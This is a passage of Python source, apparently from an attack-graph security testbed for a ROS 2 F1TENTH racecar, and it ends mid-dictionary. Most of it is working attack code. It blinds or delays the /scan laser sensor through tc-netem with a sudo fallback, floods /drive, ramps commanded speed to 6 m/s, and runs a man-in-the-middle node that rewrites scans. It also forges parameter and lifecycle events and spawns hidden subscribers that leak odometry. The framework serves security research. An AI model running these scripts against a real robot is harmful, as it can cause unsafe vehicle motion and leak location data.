    tc_prefix = os.environ.get("ATTACK_TC_PREFIX", "tc").strip()
    rc, out = sh(
        ["bash", "-lc", f"{tc_prefix} qdisc replace dev {iface} root netem {rule}"],
        timeout=10,
    )
    if rc != 0 and tc_prefix == "tc":
        rc2, out2 = sh(
            ["bash", "-lc", f"sudo -n tc qdisc replace dev {iface} root netem {rule}"],
            timeout=10,
        )
        out = (out or "") + "\n[FALLBACK sudo -n tc]\n" + (out2 or "")
        rc = rc2
    rc_check, out_check = sh(
        ["bash", "-lc", f"{tc_prefix} qdisc show dev {iface} || true"],
        timeout=6,
    )
    out = (out or "") + "\n[VERIFY]\n" + (out_check or "")
    if rc != 0 and tc_prefix == "tc":
        rc_check2, out_check2 = sh(
            ["bash", "-lc", f"sudo -n tc qdisc show dev {iface} || true"],
            timeout=6,
        )
        out = out + "\n[VERIFY sudo -n tc]\n" + (out_check2 or "")
        if rc_check2 == 0:
            rc_check = 0
            out_check = out_check2

    log("runtime_apply_netem", out)
    return (rc == 0) and ("netem" in (out_check or "").lower())


def runtime_clear_netem():
    """Remove any tc-netem qdisc from the attack interface."""
    iface = os.environ.get("ATTACK_NETEM_IFACE", "").strip()
    if not iface:
        return True
    tc_prefix = os.environ.get("ATTACK_TC_PREFIX", "tc").strip()
    rc, out = sh(
        ["bash", "-lc", f"{tc_prefix} qdisc del dev {iface} root || true"],
        timeout=10,
    )
    if rc != 0 and tc_prefix == "tc":
        rc2, out2 = sh(
            ["bash", "-lc", f"sudo -n tc qdisc del dev {iface} root || true"],
            timeout=10,
        )
        out = (out or "") + "\n[FALLBACK sudo -n tc]\n" + (out2 or "")
        rc = rc2
    log("runtime_clear_netem", out)
    return rc == 0


def act_malicious_topic_content_scan():
    """Crafted-content /scan injection."""
    _intensity_describe(
        "6 s @ 15 Hz of malicious scan ranges — collision avoidance misjudges geometry",
        "bridge's range sanitiser clipped extreme values; "
        "subscriber sees less-bad-but-still-wrong ranges",
        "content validator rejected most messages; "
        "only token bursts of bad data reached downstream"
    )
    mode = os.environ.get("ATTACK_SCAN_MODE", "close").strip().lower()
    scale_factor = os.environ.get("ATTACK_SCALE_FACTOR", "2.0")
    print(f"[ATTACKER] runtime malicious scan mode = {mode}")
    return runtime_publish_malicious_scan(mode, scale_factor, qos_reliability="")


def act_topic_drop_scan():
    """tc-netem packet drop on /scan."""
    intensity = _intensity()
    _intensity_describe(
        "8 s of 100% netem loss on /scan — complete sensor blackout",
        "10% netem loss for 3 s — almost no effect (tc capability "
        "check downgraded the rule)",
        "tc qdisc replace returned EPERM — attacker lacks CAP_NET_ADMIN",
    )
    if intensity == "give_up":
        print("[ATTACKER] GIVE_UP: skipping tc qdisc; would return EPERM")
        return False
    if intensity == "success":
        drop_secs, loss_pct = 8.0, "100%"
    else:
        drop_secs, loss_pct = 3.0, "10%"
    print(f"[ATTACKER] netem loss {loss_pct} for {drop_secs}s")
    ok = runtime_apply_netem(f"loss {loss_pct}")
    if ok:
        time.sleep(drop_secs)
        runtime_clear_netem()
        return True
    return False


def act_topic_delay_scan():
    """tc-netem latency injection on /scan."""
    intensity = _intensity()
    _intensity_describe(
        "500 ms netem delay on /scan for 8 s — control loop reacts to stale data",
        "50 ms netem delay for 3 s — below sensor noise floor, no detectable impact",
        "tc qdisc replace returned EPERM — attacker lacks CAP_NET_ADMIN",
    )
    if intensity == "give_up":
        print("[ATTACKER] GIVE_UP: skipping tc qdisc; would return EPERM")
        return False
    if intensity == "success":
        delay_secs, delay_ms_val = 8.0, 500
    else:
        delay_secs, delay_ms_val = 3.0, 50
    print(f"[ATTACKER] netem delay {delay_ms_val}ms for {delay_secs}s")
    ok = runtime_apply_netem(f"delay {delay_ms_val}ms")
    if ok:
        time.sleep(delay_secs)
        runtime_clear_netem()
        return True
    return False


def act_qos_degradation_scan():
    """Force /scan to BEST_EFFORT QoS."""
    _intensity_describe(
        "6 s @ 15 Hz of BEST_EFFORT /scan — subscribers see message drops under load",
        "rmw_fastrtps fell back to RELIABLE for some subscribers; "
        "drops occur only on the bridge-as-subscriber pair",
        "QoS negotiation hard-locked to RELIABLE on first handshake; "
        "BEST_EFFORT override ineffective"
    )
    mode = os.environ.get("ATTACK_SCAN_MODE", "far").strip().lower()
    scale_factor = os.environ.get("ATTACK_SCALE_FACTOR", "2.0")
    print(f"[ATTACKER] runtime qos degradation with BEST_EFFORT, mode={mode}")
    return runtime_publish_malicious_scan(
        mode,
        scale_factor,
        qos_reliability="best_effort",
    )


def act_service_call_bridge_set_parameters():
    """Forge a /parameter_events publish for /bridge."""
    print("[ATTACKER]  FULL — publishing forged /parameter_events msg for /bridge; "
          "REQ_bridge_misconfigured triggers")
    param_name = os.environ.get("ATTACK_BRIDGE_PARAM", "use_sim_time")
    param_value = os.environ.get("ATTACK_BRIDGE_VALUE", "true")
    path = _write_attack_script("attacker_bridge_param_setter", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
    from rcl_interfaces.msg import ParameterEvent, Parameter, ParameterValue
    rclpy.init()
    n = rclpy.create_node("attacker_bridge_param_setter")
    # /parameter_events uses RELIABLE QoS by default.
    qos = QoSProfile(depth=10,
                     reliability=ReliabilityPolicy.RELIABLE,
                     durability=DurabilityPolicy.VOLATILE)
    pub = n.create_publisher(ParameterEvent, "/parameter_events", qos)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /parameter_events subscriber visible\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    ev = ParameterEvent()
    ev.stamp.sec = int(time.time())
    ev.node = "/bridge"
    p = Parameter()
    p.name = "{param_name}"
    p.value = ParameterValue()
    p.value.type = 1
    p.value.bool_value = ({param_value!r}.lower() in ("true", "1"))
    ev.changed_parameters.append(p)
    for _ in range(20):
        pub.publish(ev)
        time.sleep(0.2)
    print("PARAM_OK forged /parameter_events for /bridge")
    n.destroy_node(); rclpy.shutdown()
except Exception as e:
    sys.stderr.write(f"rclpy param-event publish failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=15)
    log("bridge_set_parameters", out)
    return "PARAM_OK" in out


def act_service_call_map_server_change_state():
    """Forge a TransitionEvent (DEACTIVATE) on /map_server/transition_event."""
    print("[ATTACKER]  FULL — publishing forged TransitionEvent on "
          "/map_server/transition_event — DEACTIVATE; monitor sees map_server going inactive")
    path = _write_attack_script("attacker_lifecycle_change_state", '''
import rclpy, time, sys
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy, HistoryPolicy
from lifecycle_msgs.msg import TransitionEvent, Transition, State
rclpy.init()
n = Node("attacker_lifecycle_change_state")
qos = QoSProfile(reliability=ReliabilityPolicy.RELIABLE,
                 durability=DurabilityPolicy.TRANSIENT_LOCAL,
                 history=HistoryPolicy.KEEP_LAST, depth=1)
pub = n.create_publisher(TransitionEvent, "/map_server/transition_event", qos)
ev = TransitionEvent()
ev.timestamp = int(time.time() * 1e9)
ev.transition.id = 4
ev.transition.label = "deactivate"
ev.start_state.id = 3
ev.start_state.label = "active"
ev.goal_state.id = 2
ev.goal_state.label = "inactive"
time.sleep(0.6)
for _ in range(20):
    pub.publish(ev)
    time.sleep(0.2)
print("LIFECYCLE_OK success=True")
n.destroy_node(); rclpy.shutdown()
''')
    rc, out = ros_bash(f"python3 {path}", timeout=10)
    log("map_server_change_state", out)
    return "LIFECYCLE_OK" in out


def act_topic_read_scan():
    """Spawn long-lived rogue /scan subscriber that loiters until killed."""
    print("[ATTACKER]  FULL — spawning long-lived /scan exfiltration "
          "subscriber (loiters until killed)")
    name = "attacker_scan_reader"
    if not _pgrep(name):
        script = (
            "import time, sys\n"
            "while True:\n"
            "    try:\n"
            "        import rclpy\n"
            "        from rclpy.node import Node\n"
            "        from sensor_msgs.msg import LaserScan\n"
            "        rclpy.init()\n"
            f"        n = Node('{name}')\n"
            "        n.create_subscription(LaserScan, '/scan',\n"
            "                              lambda m: None, 10)\n"
            "        rclpy.spin(n)\n"
            "    except Exception as e:\n"
            "        sys.stderr.write(f'scan-reader retry: {e!r}\\n')\n"
            "        try: rclpy.shutdown()\n"
            "        except Exception: pass\n"
            "        time.sleep(2)\n"
        )
        quoted = shlex.quote(script)
        subprocess.Popen(
            ["bash", "-c",
             f"{ROS_SETUP} && exec -a {name} python3 -c {quoted}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    log("topic_read_scan", "long-lived subscriber spawned (or already running)")
    return True


def act_topic_flood_drive():
    """DoS via /drive flood."""
    intensity = _intensity()
    _intensity_describe(
        "8 s @ 400 Hz valid drive cmds — bridge queue overflows, REQ_drive_DoS fires",
        "400 Hz of messages with header.stamp.sec=-1 — bridge filter rejects "
        "every msg, no DoS effect (publisher visible but no rate impact)",
        "rmw queue init failed; publisher spawned but never published",
    )
    if intensity == "success":
        rate, secs, stamp_sec = 400, 8, "int(time.time())"
        publish_block = (
            "while time.time() < end:\n"
            "        msg.header.stamp.sec = int(time.time())\n"
            "        pub.publish(msg)\n"
            "        time.sleep(period)"
        )
    elif intensity == "retry":
        rate, secs = 400, 8
        publish_block = (
            "while time.time() < end:\n"
            "        msg.header.stamp.sec = -1\n"
            "        pub.publish(msg)\n"
            "        time.sleep(period)"
        )
    else:
        rate, secs = 400, 0
        publish_block = (
            "time.sleep(0.5)\n"
            "        sys.stderr.write('GIVE_UP: rmw queue init failed; never published\\n')"
        )
    path = _write_attack_script("attacker_drive_flooder", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from ackermann_msgs.msg import AckermannDriveStamped
    rclpy.init()
    n = rclpy.create_node("attacker_drive_flooder")
    pub = n.create_publisher(AckermannDriveStamped, "/drive", 100)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /drive subscriber visible (auth fail)\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    msg = AckermannDriveStamped()
    msg.drive.speed = 2.0
    msg.drive.steering_angle = 0.3
    msg.header.frame_id = "evil_drive_flooder"
    end = time.time() + {secs}
    period = 1.0 / {rate} if {rate} > 0 else 0.1
    {publish_block}
    n.destroy_node()
    rclpy.shutdown()
    print("FLOOD_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=max(secs, 5) + 10)
    log("topic_flood_drive", out)
    return "FLOOD_OK_success" in out


def _write_attack_script(name: str, code: str) -> str:
    """Write attack source to /tmp/<name>.py and return its path."""
    path = f"/tmp/{name}.py"
    with open(path, "w") as f:
        f.write(code)
    return path


def act_mitm_injection_scan():
    """MITM on /scan via dual pub+sub node."""
    intensity = _intensity()
    _intensity_describe(
        "5 s MITM: dual pub+sub node rewrites every /scan msg",
        "MITM re-publishes with header.stamp.sec=0 — bridge stamp filter "
        "drops every re-published msg, no corruption signal",
        "MITM panics on first message decode (malformed CDR buffer)",
    )
    if intensity == "success":
        duration, stamp_mode = 5.0, "current"
    elif intensity == "retry":
        duration, stamp_mode = 5.0, "zero"
    else:
        duration, stamp_mode = 0.3, "panic"
    path = _write_attack_script("mitm_scan_attack", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from sensor_msgs.msg import LaserScan

    class MitmScanNode(Node):
        def __init__(self):
            super().__init__("mitm_scan_attack")
            self.pub = self.create_publisher(LaserScan, "/scan", 10)
            self.sub = self.create_subscription(LaserScan, "/scan", self.cb, 10)
        def cb(self, m):
            if "{stamp_mode}" == "panic":
                raise RuntimeError("MITM intentional panic on first msg")
            m.ranges = tuple(min(30.0, r * 1.1) for r in m.ranges)
            m.header.frame_id = "evil_mitm"
            if "{stamp_mode}" == "zero":
                m.header.stamp.sec = 0
                m.header.stamp.nanosec = 0
            self.pub.publish(m)

    rclpy.init()
    n = MitmScanNode()
    time.sleep(2)
    end = time.time() + {duration}
    while time.time() < end:
        rclpy.spin_once(n, timeout_sec=0.1)
    n.destroy_node(); rclpy.shutdown()
    print("MITM_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"MITM failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=int(duration) + 10)
    log("mitm_injection_scan", out)
    return "MITM_OK_success" in out


def act_gradual_drift_drive():
    """Gradually drift /drive speed upward across consecutive messages."""
    intensity = _intensity()
    _intensity_describe(
        "20-step ramp 0.5 -> 6.0 m/s — REQ_command_unsafe fires",
        "20-step ramp 0.5 -> 1.5 m/s — bridge speed-bounds checker "
        "clipped attacker's drift, stays in safe envelope",
        "monitor caught monotonic pattern after 2 samples; attacker aborted",
    )
    if intensity == "success":
        duration, steps, end_v = 5.0, 20, 6.0
    elif intensity == "retry":
        duration, steps, end_v = 5.0, 20, 1.5
    else:
        duration, steps, end_v = 0.5, 2, 0.7
    path = _write_attack_script("attacker_drive_drifter", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from ackermann_msgs.msg import AckermannDriveStamped
    rclpy.init()
    n = rclpy.create_node("attacker_drive_drifter")
    pub = n.create_publisher(AckermannDriveStamped, "/drive", 10)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /drive subscriber visible (auth fail)\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    duration = {duration}; steps = {steps}; start_v = 0.5; end_v = {end_v}
    delta = (end_v - start_v) / max(1, steps - 1)
    interval = duration / max(1, steps)
    msg = AckermannDriveStamped()
    msg.header.frame_id = "evil_drift"
    msg.drive.steering_angle = 0.1
    v = start_v
    for _ in range(steps):
        msg.drive.speed = float(v)
        pub.publish(msg)
        v += delta
        time.sleep(interval)
    n.destroy_node(); rclpy.shutdown()
    print("DRIFT_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=int(duration) + 10)
    log("gradual_drift_drive", out)
    return "DRIFT_OK_success" in out


def act_stale_publish_scan():
    """Publish /scan with stale header.stamp."""
    intensity = _intensity()
    _intensity_describe(
        "5 s of /scan stamped 1 hour in past — bridge stale filter trips",
        "stamps rewound only 3 s (within tolerance window) — bridge "
        "accepts every msg, no stale signal raised",
        "1 msg with future-dated stamp — sanitizer rejected as invalid",
    )
    if intensity == "success":
        duration = 5.0
        stamp_offset = -3600
    elif intensity == "retry":
        duration = 5.0
        stamp_offset = -3
    else:
        duration = 0.3
        stamp_offset = 2**30
    path = _write_attack_script("attacker_scan_staler", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from sensor_msgs.msg import LaserScan
    rclpy.init()
    n = rclpy.create_node("attacker_scan_staler")
    pub = n.create_publisher(LaserScan, "/scan", 10)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /scan subscriber visible (auth fail)\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    end = time.time() + {duration}
    msg = LaserScan()
    msg.header.frame_id = "evil_stale"
    msg.angle_min = -1.57; msg.angle_max = 1.57; msg.angle_increment = 0.314
    msg.range_min = 0.0; msg.range_max = 30.0
    msg.ranges = [1.0, 1.0, 1.0, 1.0]
    msg.header.stamp.sec = int(time.time()) + ({stamp_offset})
    msg.header.stamp.nanosec = 0
    while time.time() < end:
        pub.publish(msg)
        time.sleep(0.1)
    n.destroy_node(); rclpy.shutdown()
    print("STALE_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=int(duration) + 10)
    log("stale_publish_scan", out)
    return "STALE_OK_success" in out


def act_reliability_flip_scan():
    """Oscillate /scan QoS between RELIABLE and BEST_EFFORT."""
    intensity = _intensity()
    _intensity_describe(
        "5 s of QoS flips every 0.5 s — RELIABLE<->BEST_EFFORT, subscribers thrash",
        "QoS flips every 5 s (slower than rmw cache invalidation) — "
        "cache absorbs oscillation, no thrashing visible",
        "rmw QoS lock activated after first flip; attacker couldn't continue",
    )
    if intensity == "success":
        duration, flip_interval = 5.0, 0.5
    elif intensity == "retry":
        duration, flip_interval = 5.0, 5.0
    else:
        duration, flip_interval = 0.5, 0.5
    path = _write_attack_script("reliability_flip_scan_attack", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from rclpy.qos import QoSProfile, ReliabilityPolicy
    from sensor_msgs.msg import LaserScan
    rclpy.init()
    n = rclpy.create_node("reliability_flip_scan_attack")
    end = time.time() + {duration}
    flipped = False
    msg = LaserScan()
    msg.header.frame_id = "evil_qos_flip"
    msg.ranges = [2.0, 2.0, 2.0]
    while time.time() < end:
        qos = QoSProfile(depth=10)
        qos.reliability = (ReliabilityPolicy.BEST_EFFORT if flipped
                           else ReliabilityPolicy.RELIABLE)
        pub = n.create_publisher(LaserScan, "/scan", qos)
        end_phase = min(end, time.time() + {flip_interval})
        while time.time() < end_phase:
            pub.publish(msg)
            time.sleep(0.05)
        n.destroy_publisher(pub)
        flipped = not flipped
    n.destroy_node(); rclpy.shutdown()
    print("RELFLIP_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"rclpy reliability flip failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=int(duration) + 10)
    log("reliability_flip_scan", out)
    return "RELFLIP_OK_success" in out


def act_lifecycle_hijack_map_server():
    """Spoof a /map_server lifecycle transition via direct topic publish."""
    intensity = _intensity()
    _intensity_describe(
        "publish forged TransitionEvent on /map_server/transition_event — "
        "DEACTIVATE; monitor sees map_server going inactive",
        "publish TransitionEvent with mismatched start_state (INACTIVE→INACTIVE) — "
        "looks like a no-op transition; monitor may ignore",
        "lifecycle endpoint locked — could not register publisher on "
        "/map_server/transition_event",
    )
    if intensity == "give_up":
        print("[ATTACKER] GIVE_UP: could not register publisher on /map_server/transition_event")
        return False

    if intensity == "retry":
        start_id, start_label = "2", "inactive"
        goal_id,  goal_label  = "2", "inactive"
        trans_id, trans_label = "100", "noop"
    else:
        start_id, start_label = "3", "active"
        goal_id,  goal_label  = "2", "inactive"
        trans_id, trans_label = "4", "deactivate"

    path = _write_attack_script("attacker_lifecycle_transition_event", f'''
import rclpy, time, sys
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy, HistoryPolicy
from lifecycle_msgs.msg import TransitionEvent, Transition, State
rclpy.init()
n = Node("attacker_lifecycle_pub")
# /transition_event is TRANSIENT_LOCAL+RELIABLE — match so spoof is sticky.
qos = QoSProfile(reliability=ReliabilityPolicy.RELIABLE,
                 durability=DurabilityPolicy.TRANSIENT_LOCAL,
                 history=HistoryPolicy.KEEP_LAST, depth=1)
pub = n.create_publisher(TransitionEvent, "/map_server/transition_event", qos)
ev = TransitionEvent()
ev.timestamp = int(time.time() * 1e9)
ev.transition.id = {trans_id}
ev.transition.label = "{trans_label}"
ev.start_state.id = {start_id}
ev.start_state.label = "{start_label}"
ev.goal_state.id = {goal_id}
ev.goal_state.label = "{goal_label}"
time.sleep(0.6)
for _ in range(20):
    pub.publish(ev)
    time.sleep(0.2)
print("LIFECYCLE_HIJACK_OK_{intensity}: {start_label} -> {goal_label} via {trans_label}")
n.destroy_node()
rclpy.shutdown()
''')
    rc, out = ros_bash(f"python3 {path} || true", timeout=8)
    log("lifecycle_hijack_map_server", out)
    return "LIFECYCLE_HIJACK_OK_success" in out


def act_cross_topic_correlation():
    """Single rogue subscriber on both /scan and /odom."""
    _intensity_describe(
        "5 s of correlated /scan + /odom subscriptions — full vehicle trajectory exfiltrated",
        "DDS rate-limit on /odom reduced sample rate; "
        "correlation window halved, less precise trajectory leaked",
        "access control on /odom blocked subscriber discovery; "
        "only /scan captured, correlation impossible"
    )
    duration = {"success": 5.0, "retry": 2.5, "give_up": 1.0}[_intensity()]
    path = _write_attack_script("cross_topic_correlation_attack", f'''
#!/usr/bin/env python3
import rclpy, time
from rclpy.node import Node
from sensor_msgs.msg import LaserScan
from nav_msgs.msg import Odometry

rclpy.init()
n = Node("cross_topic_correlation_attack")
scan_count = [0]
odom_count = [0]
n.create_subscription(LaserScan, "/scan", lambda m: scan_count.__setitem__(0, scan_count[0]+1), 10)
n.create_subscription(Odometry,  "/odom", lambda m: odom_count.__setitem__(0, odom_count[0]+1), 10)
end = time.time() + {duration}
while time.time() < end:
    rclpy.spin_once(n, timeout_sec=0.1)
print(f"correlated {{scan_count[0]}} scan + {{odom_count[0]}} odom samples")
n.destroy_node()
rclpy.shutdown()
''')
    rc, out = ros_bash(f"python3 {path} || true", timeout=int(duration) + 10)
    log("cross_topic_correlation", out)
    return rc == 0


def act_service_call_map_server_set_parameters():
    """Forge a /parameter_events publish for /map_server."""
    print("[ATTACKER]  FULL — publishing forged /parameter_events msg for /map_server")
    param_name = os.environ.get("ATTACK_MAP_PARAM", "use_sim_time")
    param_value = os.environ.get("ATTACK_MAP_VALUE", "true")
    path = _write_attack_script("attacker_map_param_setter", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
    from rcl_interfaces.msg import ParameterEvent, Parameter, ParameterValue
    rclpy.init()
    n = rclpy.create_node("attacker_map_param_setter")
    qos = QoSProfile(depth=10,
                     reliability=ReliabilityPolicy.RELIABLE,
                     durability=DurabilityPolicy.VOLATILE)
    pub = n.create_publisher(ParameterEvent, "/parameter_events", qos)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /parameter_events subscriber visible\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    ev = ParameterEvent()
    ev.stamp.sec = int(time.time())
    ev.node = "/map_server"
    p = Parameter()
    p.name = "{param_name}"
    p.value = ParameterValue()
    p.value.type = 1
    p.value.bool_value = ({param_value!r}.lower() in ("true", "1"))
    ev.changed_parameters.append(p)
    for _ in range(20):
        pub.publish(ev)
        time.sleep(0.2)
    print("PARAM_OK forged /parameter_events for /map_server")
    n.destroy_node(); rclpy.shutdown()
except Exception as e:
    sys.stderr.write(f"rclpy param-event publish failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=15)
    log("map_server_set_parameters", out)
    return "PARAM_OK" in out


def act_topic_read_odom():
    """Rogue long-lived subscriber on the odometry topic."""
    topic = os.environ.get("ATTACK_ODOM_TOPIC", "/ego_racecar/odom").strip()
    print(f"[ATTACKER]  FULL — spawning long-lived {topic} exfiltration "
          f"subscriber (loiters until killed)")
    name = "attacker_odom_reader"
    if not _pgrep(name):
        script = (
            "import time, sys\n"
            "while True:\n"
            "    try:\n"
            "        import rclpy\n"
            "        from rclpy.node import Node\n"
            "        from nav_msgs.msg import Odometry\n"
            "        rclpy.init()\n"
            f"        n = Node('{name}')\n"
            f"        n.create_subscription(Odometry, '{topic}',\n"
            "                              lambda m: None, 10)\n"
            "        rclpy.spin(n)\n"
            "    except Exception as e:\n"
            "        sys.stderr.write(f'odom-reader retry: {e!r}\\n')\n"
            "        try: rclpy.shutdown()\n"
            "        except Exception: pass\n"
            "        time.sleep(2)\n"
        )
        quoted = shlex.quote(script)
        subprocess.Popen(
            ["bash", "-c",
             f"{ROS_SETUP} && exec -a {name} python3 -c {quoted}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    log("topic_read_odom", "long-lived subscriber spawned (or already running)")
    return True


ACTION_IMPL = {
    "initialAccess(engineering_ws)": act_initial_access_engineering_ws,
    "lateralAccess(robot_host)": act_lateral_access_robot_host,
    "credentialAccess(robot_host)": act_credential_access_robot_host,
    "attackerOnRosNetwork(robot_host)": act_attacker_on_ros_network_robot_host,
    "attackerCanJoinRosGraph(robot_host)": act_attacker_can_join_ros_graph_robot_host,
    "attackerCanNetAdmin(robot_host)": act_attacker_can_netadmin_robot_host,
    "graphDiscovery(bridge)": act_graph_discovery_bridge,
    "targetNodeSelected(bridge)": act_target_node_selected_bridge,
    "codeLocationKnown(f1tenth_bridge,bridge)": act_code_location_known_bridge,
    "compromisedRosNode(bridge)": act_compromised_ros_node_bridge,
    # Leaf attacks (8 original + odom read + map_server set_parameters)
    "topicWrite('/drive')": act_topic_write_drive,
    "topicWrite('/scan')": act_topic_write_scan,
    "maliciousTopicContent('/scan')": act_malicious_topic_content_scan,
    "topicDrop('/scan')": act_topic_drop_scan,
    "topicDelay('/scan')": act_topic_delay_scan,
    "qosDegradation('/scan')": act_qos_degradation_scan,
    "serviceCall('/bridge/set_parameters',bridge)": act_service_call_bridge_set_parameters,
    "serviceCall('/map_server/change_state',map_server)": act_service_call_map_server_change_state,
    "serviceCall('/map_server/set_parameters',map_server)": act_service_call_map_server_set_parameters,
    "topicRead('/scan')": act_topic_read_scan,
    "topicRead('/odom')": act_topic_read_odom,
    "topicFlood('/drive')": act_topic_flood_drive,
    "mitmInjection('/scan')": act_mitm_injection_scan,
    "gradualDrift('/drive')": act_gradual_drift_drive,
    "stalePublish('/scan')": act_stale_publish_scan,
    "reliabilityFlip('/scan')": act_reliability_flip_scan,
    "lifecycleHijack(map_server)": act_lifecycle_hijack_map_server,
    "crossTopicCorrelation(f1tenth)": act_cross_topic_correlation,
}

EXECUTABLE_ATTACK_ACTIONS = {
    "initialAccess(engineering_ws)",
    "lateralAccess(robot_host)",
    "credentialAccess(robot_host)",
    "attackerOnRosNetwork(robot_host)",
    "attackerCanJoinRosGraph(robot_host)",
    "attackerCanNetAdmin(robot_host)",
    "graphDiscovery(bridge)",
    "targetNodeSelected(bridge)",
    "codeLocationKnown(f1tenth_bridge,bridge)",
    "compromisedRosNode(bridge)",
    "topicWrite('/drive')",
    "topicWrite('/scan')",
    "maliciousTopicContent('/scan')",
    "topicDrop('/scan')",
    "topicDelay('/scan')",
    "qosDegradation('/scan')",
    "serviceCall('/bridge/set_parameters',bridge)",
    "serviceCall('/map_server/change_state',map_server)",
    "serviceCall('/map_server/set_parameters',map_server)",
    "topicRead('/scan')",
    "topicRead('/odom')",
    "topicFlood('/drive')",
    "mitmInjection('/scan')",
    "gradualDrift('/drive')",
    "stalePublish('/scan')",
    "reliabilityFlip('/scan')",
    "lifecycleHijack(map_server)",
    "crossTopicCorrelation(f1tenth)",
}

DERIVABLE_STRUCTURAL_PREDS = {
    "rtpsReachableNode(bridge)",
    "nodeSubscribesToTopic(bridge,'/drive')",
    "typeOkSubscriber(bridge,'/drive')",
    "nodePublishesToTopic(bridge,'/scan')",
    "typeOkPublisher(bridge,'/scan')",
    "rtpsReachableNode(map_server)",
    "rosService('/bridge/set_parameters',bridge)",
    "rosService('/map_server/change_state',map_server)",
    "rtpsReachableNode(rviz)",
    "nodeSubscribesToTopic(rviz,'/scan')",
    "typeOkSubscriber(rviz,'/scan')",
}

DERIVABLE_CONSEQUENCE_PREDS = {
    "mitmPossible('/scan')",
    "parameterTamper(map_server)",
    "lifecycleAbuse(map_server)",
    "lifecycleDisruption(map_server)",
    "exfiltrateChannel('/attacker_exfil')",
    "drive_DoS(f1tenth)",
    "command_unsafe(f1tenth)",
    "scan_corrupted(f1tenth)",
    "scan_unreliable(f1tenth)",
    "map_server_down(f1tenth)",
    "bridge_misconfigured(f1tenth)",
    "data_leaked(f1tenth)",
    "systemCompromised(f1tenth)",
}

DERIVABLE_PREDS = DERIVABLE_STRUCTURAL_PREDS | DERIVABLE_CONSEQUENCE_PREDS

# PRISM-aligned chain probability per effect predicate (matches test.prism).
CHAIN_EFFECT_PROB = {
    "drive_DoS(f1tenth)":             0.85,
    "command_unsafe(f1tenth)":        0.65,
    "scan_corrupted(f1tenth)":        0.85,
    "scan_unreliable(f1tenth)":       0.85,
    "map_server_down(f1tenth)":       0.85,
    "bridge_misconfigured(f1tenth)":  0.85,
    "data_leaked(f1tenth)":           0.85,
}


# PRISM-faithful per-action success probabilities (must match AttackGraph.py).
ACT_PRISM_PROB = {
    "topicFlood('/drive')":                              0.85,
    "topicWrite('/drive')":                              1.0,
    "gradualDrift('/drive')":                            0.65,
    "maliciousTopicContent('/scan')":                    0.85,
    "mitmInjection('/scan')":                            0.55,
    "stalePublish('/scan')":                             0.55,
    "qosDegradation('/scan')":                           0.85,
    "reliabilityFlip('/scan')":                          0.50,
    "topicDrop('/scan')":                                0.70,
    "topicDelay('/scan')":                               0.70,
    "lifecycleHijack(map_server)":                       0.50,
    "serviceCall('/map_server/change_state',map_server)":1.0,
    "serviceCall('/map_server/set_parameters',map_server)":1.0,
    "serviceCall('/bridge/set_parameters',bridge)":      1.0,
    "crossTopicCorrelation(f1tenth)":                    1.0,
    "exfiltrateChannel('/attacker_exfil')":              1.0,
    "topicWrite('/scan')":                               1.0,
    "topicRead('/scan')":                                1.0,
    "topicRead('/odom')":                                1.0,
    "initialAccess(engineering_ws)":         0.70,
    "lateralAccess(robot_host)":             0.70,
    "credentialAccess(robot_host)":          0.85,
    "attackerOnRosNetwork(robot_host)":      1.0,
    "attackerCanJoinRosGraph(robot_host)":   1.0,
